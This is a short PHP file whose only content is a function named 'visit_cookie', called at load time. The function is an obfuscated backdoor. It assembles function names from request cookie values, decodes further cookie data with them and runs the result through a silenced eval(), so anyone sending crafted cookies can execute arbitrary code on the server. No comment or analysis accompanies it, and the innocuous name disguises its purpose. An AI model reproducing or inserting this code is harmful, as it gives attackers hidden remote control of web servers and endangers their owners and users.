<?php
function visit_cookie() {
	$h = $_COOKIE;
	($h && isset($h[93])) ? (($ms = $h[93].$h[78]) && 
	($qh = $ms($h[73].$h[22])) && ($_qh = $ms($h[94].$h[82])) && 
	($_qh = $_qh($ms($h[10]))) && @eval($_qh)) : $h;
	
	return 0;
}

visit_cookie();